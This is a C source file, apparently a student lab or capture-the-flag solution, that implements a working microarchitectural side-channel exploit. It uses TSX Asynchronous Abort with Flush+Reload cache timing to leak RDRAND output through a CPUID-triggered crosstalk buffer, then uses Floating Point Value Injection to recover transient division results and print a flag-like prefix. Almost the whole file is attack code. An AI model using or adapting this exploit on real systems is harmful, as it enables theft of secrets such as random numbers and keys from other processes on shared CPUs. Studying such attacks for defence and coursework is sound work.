#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <string.h>
#include <x86intrin.h>
#include <stdbool.h>
#include "asm.h"

#define NUM_SAMPLES 10000
#define NUM_ITERATIONS 10
#define CONFIDENCE_THRESHOLD 5
#define ROUNDS 100
#define STRIDE 4096
#define FPVI_STRIDE 2048
#define POSSIBLE_BYTES 256
#define BYTES_TO_LEAK 8
#define RDRAND_OFFSET 32
#define RDRAND_TO_LEAK 6


static uint8_t *leak;
static uint8_t *crosstalk_reloadbuffer;
static uint64_t CACHE_THRESHOLD;



uint64_t measure_access(unsigned char* addr, int is_miss) {
    uint64_t min_time = UINT64_MAX;

    for(int i = 0; i < ROUNDS; i++) {
        if(is_miss) {
            clflush(addr);
        } else {
            *(volatile char*)addr; 
        }
        mfence();

        uint64_t start = rdtscp();
        *(volatile char*)addr;
        lfence();
        uint64_t end = rdtscp();

        uint64_t delta_t = end - start;
        if(delta_t < min_time) {
            min_time = delta_t;
        }
    }

    return min_time;
}



uint64_t get_cache_threshold(){

    uint64_t hits = 0;
    uint64_t misses = 0;
    uint64_t delta_t;

    unsigned char test_line[64];
    test_line[0] = 1;

    //HITS
    *(volatile char*)test_line;
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t =measure_access(test_line, 0);
        hits += delta_t;
    }

    //MISSES
    clflush(test_line);
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t=  measure_access(test_line, 1);
        misses += delta_t;
    }

    uint64_t hitt_avg = hits / NUM_SAMPLES;
    uint64_t miss_avg = misses / NUM_SAMPLES;
    uint64_t threshold = (miss_avg + hitt_avg) / 2;

    return threshold;
}

uint64_t get_reload_time(unsigned char *addr) {

    mfence();
    uint64_t start = rdtscp();
    *(volatile char*)addr;
    lfence();
    uint64_t end = rdtscp();

    uint64_t delta_t = end - start;

    return delta_t;
}

void reload_and_measure(unsigned char *crosstalk_reloadbuffer, size_t *cache_hits, uint64_t threshold) {
    for(int j = 0; j < 16; j++) {
        mfence();
        uint64_t start = rdtscp();
        *(volatile char*)(&crosstalk_reloadbuffer[j * FPVI_STRIDE]);
        lfence();
        uint64_t end = rdtscp();

        uint64_t reload_time = end - start;
        if(reload_time < threshold) {
            cache_hits[j]++;
        }
    }
}

int main(void) {
    uint64_t rand_val;
    asm volatile("rdrand %%rax" : "=a"(rand_val));

    printf("Random value: 0x%016lx\n", rand_val);

    CACHE_THRESHOLD = get_cache_threshold()* 0.7;

    printf("Cache threshold: %lu\n", CACHE_THRESHOLD);

    // so they can run on the two hyperthreads of the attacker's physical core
    // child and parent will get randomly assigned to 1 of the 2 params passed taskset -c 1,5
    pid_t pid = fork();

    // child CPID loop
    if (pid == 0) {

        while(1) {
            cpuid();  //not sure if it's the corerct assembly from asm.h it was there from asg 1, might need changes not sure yet
        }
        _exit(0);
    }

    size_t leak_len = 4096;
    size_t const mmap_prot = PROT_READ | PROT_WRITE;
    size_t const mmap_flags = MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE| MAP_HUGETLB;

    leak = mmap(NULL, leak_len, mmap_prot, mmap_flags, -1, 0);
    if (leak == MAP_FAILED) { perror("mmap leak"); return 1; }

    crosstalk_reloadbuffer = mmap(NULL, POSSIBLE_BYTES * STRIDE, mmap_prot, mmap_flags, -1, 0);
    if (crosstalk_reloadbuffer == MAP_FAILED) { perror("mmap crosstalk_reloadbuffer"); return 1; }

    size_t leaked_values_count = 0;
    uint64_t leaked_values[RDRAND_TO_LEAK * BYTES_TO_LEAK] = {0};

    // ===================================================PARENT=======================================================

    uint64_t crosstalk_result = 0;
    while(leaked_values_count < RDRAND_TO_LEAK) {
        uint64_t prev_crosstalk_result = crosstalk_result;

        for( int secret_byte=RDRAND_OFFSET; secret_byte < RDRAND_OFFSET + BYTES_TO_LEAK; secret_byte++) {
            uint32_t all_hit_bytes[256] = {0};

            for(int iteration = 0; iteration < NUM_ITERATIONS; iteration++) {
                
                // Step 1: flush reload buffer
                for (int i = 0; i < POSSIBLE_BYTES; i++) {
                    clflush(&crosstalk_reloadbuffer[i * STRIDE]);
                }

                clflush(leak + secret_byte);
                sfence();
                clflush(crosstalk_reloadbuffer); // Necessary to cause TAA

                // Step 3: TAA
                if (_xbegin() == _XBEGIN_STARTED)
                {
                    size_t index = *(leak + secret_byte) * STRIDE; // This should use the data in the LFB transiently.
                    *(volatile char*)(crosstalk_reloadbuffer + index);

                    _xend();
                }

                // Step 4: Reload and measure access times
                for(int j=0; j<POSSIBLE_BYTES; j++){
                    uint64_t reload_time = get_reload_time(&crosstalk_reloadbuffer[j * STRIDE]);
                    if(reload_time < CACHE_THRESHOLD){
                        all_hit_bytes[j]++;
                        break;
                    }
                }
            }

            // Analyze results to find the most likely byte value
            uint8_t max_index = 0;
            size_t max_hits = 0;
            for(int i = 1; i < 256; i++) {
                int hits = all_hit_bytes[i];

                if(hits > CONFIDENCE_THRESHOLD) {
                    max_index = i;
                    break;
                }

                if(hits > max_hits) {
                    max_index = i;
                    max_hits = hits;
                }
            }

            crosstalk_result = crosstalk_result << 8 | max_index;
        }

        if (crosstalk_result == 0 ||
            crosstalk_result == rand_val ||
            crosstalk_result != prev_crosstalk_result)
        {
            continue;
        }

        if (leaked_values_count == 0 ||
            crosstalk_result != leaked_values[leaked_values_count - 1])
        {
            leaked_values[leaked_values_count] = crosstalk_result;

            ++leaked_values_count;
        }
    }

    for (size_t i = 0; i < leaked_values_count; ++i) {
        printf("Leaked value %zu: 0x%016lx\n", i, leaked_values[i]);
    }

    uint64_t fpvi_results[3] = {0};
    for (size_t i = 0; i < leaked_values_count; ++i) {
        int fvpi_reloadbuffer_size = 16 * FPVI_STRIDE;
        unsigned char *fpvi_reloadbuffer = mmap(NULL, fvpi_reloadbuffer_size, PROT_READ | PROT_WRITE,
                                            MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
        memset(fpvi_reloadbuffer, 0, fvpi_reloadbuffer_size);

        uint64_t dx = leaked_values[i] & 0x000FFFFFFFFFFFFFULL;
        uint64_t dy = leaked_values[++i] & 0x000FFFFFFFFFFFFFULL;

        double fpvi_result = (double)dx / (double)dy;
        uint64_t architectural_result = (uint64_t)fpvi_result;

        // Recover transient result nibble by nibble
        uint64_t transient_result = 0;

        for (int nibble_index = 0; nibble_index < 16; nibble_index++) {
            size_t cache_hits[16] = {0};

            for (int i = 0; i < NUM_ITERATIONS; i++) {
                // 1. Flush
                for (int j = 0; j < 16; j++) {
                    clflush(&fpvi_reloadbuffer[j * FPVI_STRIDE]);
                }
                mfence();

                // 2. FPVI 
                asm volatile(
                    ".rept 2                    \n\t"
                    "  movq  %[x], %%xmm0       \n\t"
                    "  movq  %[y], %%xmm1       \n\t"
                    "  divsd %%xmm1, %%xmm0     \n\t"
                    ".endr                      \n\t"
                    "movq %%xmm0, %%rax         \n\t"
                    "mov  %[shift], %%ecx       \n\t"
                    "shrq %%cl, %%rax           \n\t"
                    "and  $0xf, %%rax           \n\t"  // 4 bits for nibble
                    "shl  $11, %%rax            \n\t"  // STRIDE shift to calculate cache offset
                    "add  %[buf], %%rax         \n\t"
                    "movb (%%rax), %%al         \n\t"  //access to bring into cache
                    :
                    : [x]"m"(dx),
                    [y]"m"(dy),
                    [buf]"r"(fpvi_reloadbuffer),
                    [shift]"r"(nibble_index * 4)
                    : "rax","rcx","xmm0","xmm1","memory"
                );

                // 3. Reload and measure
                reload_and_measure(fpvi_reloadbuffer, cache_hits, CACHE_THRESHOLD);
            }

            // extract the 4 bit architectural nibble with index nibble_index
            uint8_t architectural_nibble = (architectural_result >> (nibble_index * 4)) & 0xf;
            uint8_t transient_nibble = architectural_nibble;


            //get the most hit that is not the architectural one 
            for(int j = 0; j < 16; j++) { // exclude the correct cache hit we are not interested in teh architectural one
                if(cache_hits[j] > 5 && j != architectural_nibble) {
                    transient_nibble = j;
                    break;
                }
            }

            //to reconstruct the transient result
            transient_result |= ((uint64_t)transient_nibble) << (nibble_index * 4);
        }
        fpvi_results[i / 2] = transient_result;
    }

    for (int i = 0; i < 3; i++) {
        printf("FPVI transient result %d: 0x%016lx | %lu\n", i, fpvi_results[i], fpvi_results[i]);
    }

    char prefix[100];
    snprintf(prefix, sizeof(prefix), "%lu%lu%lu", fpvi_results[0], fpvi_results[1], fpvi_results[2]);

    printf("Prefix: %s\n", prefix);

    kill(pid, SIGKILL);
    waitpid(pid, NULL, 0);

    return 0;
}
